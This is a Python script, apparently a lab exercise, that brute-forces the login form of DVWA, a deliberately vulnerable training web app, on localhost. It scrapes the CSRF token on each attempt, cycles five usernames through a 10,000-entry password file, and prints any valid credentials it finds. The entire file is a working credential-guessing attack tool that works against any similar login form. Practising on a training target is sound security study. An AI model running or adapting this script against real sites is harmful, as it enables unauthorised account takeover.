import time
from datetime import timedelta
import requests
import re
from bs4 import BeautifulSoup
from tqdm import tqdm

def format_time(seconds):
    return str(timedelta(seconds=int(seconds)))

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})
    return user_token['value'] if user_token else None

def try_login(session, url, username, password):
    # Get CSRF token
    csrf_token = get_csrf_token(session, url)
    if not csrf_token:
        print(f"[ERROR] Failed to get CSRF token for {username}:{password}")
        return False
    
    # Attempt login
    data = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': csrf_token
    }
    response = session.post(url, data=data, allow_redirects=False)
    
    # Check if login was successful (redirect to index.php)
    return response.status_code == 302 and 'index.php' in response.headers.get('Location', '')

def brute_force_dvwa():
    print("\n" + "="*50)
    print("BRUTE FORCE ATTACK")
    print("="*50 + "\n")
    
    total_start_time = time.time()
    
    # DVWA login details
    base_url = "http://localhost"
    login_url = f"{base_url}/dvwa/login.php"
    
    # Test DVWA access
    try:
        response = requests.get(login_url)
        if response.status_code == 200:
            print("[SUCCESS] DVWA is accessible!")
        else:
            print(f"[ERROR] DVWA returned status code: {response.status_code}")
            return
    except requests.exceptions.ConnectionError:
        print("[ERROR] Cannot connect to DVWA. Make sure it's running on http://localhost/dvwa")
        return
    
    # List of usernames and passwords to try
    usernames = ["1337", "admin", "gordonb", "pablo", "smithy"]
    
    # Load passwords from file
    try:
        with open('../resources/10k.txt', 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print("[ERROR] Password file '../resources/10k.txt' not found")
        return
    except Exception as e:
        print(f"[ERROR] Reading password file: {str(e)}")
        return
    
    print("\nInitializing brute force attack...")
    print(f"Target usernames: {len(usernames)}")
    print(f"Password candidates: {len(passwords)}")
    print(f"Total combinations: {len(usernames) * len(passwords)}")
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    found_credentials = []
    attempts = 0
    total_combinations = len(usernames) * len(passwords)
    
    try:
        # Create progress bar
        with tqdm(total=total_combinations, desc="Testing combinations", unit="attempt") as pbar:
            for username in usernames:
                password_found = False
                for password in passwords:
                    if password_found:
                        pbar.update(1)
                        continue
                        
                    attempts += 1
                    
                    if try_login(session, login_url, username, password):
                        print(f"\n[SUCCESS] Valid credentials found: {username}:{password}")
                        found_credentials.append((username, password))
                        password_found = True
                    
                    pbar.update(1)
                    
    except KeyboardInterrupt:
        print("\n[INFO] Brute force interrupted by user")
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred: {str(e)}")
    finally:
        total_time = time.time() - total_start_time
        
        print("\n" + "="*50)
        print("BRUTE FORCE SUMMARY")
        print("="*50)
        print(f"\nTotal combinations attempted: {attempts}/{total_combinations}")
        print(f"Valid credentials found: {len(found_credentials)}")
        
        if found_credentials:
            print("\nDiscovered Credentials:")
            for username, password in found_credentials:
                print(f"[+] {username}:{password}")
                
        print(f"\nTotal execution time: {format_time(total_time)}")
        print("\n" + "="*50)

if __name__ == "__main__":
    brute_force_dvwa()
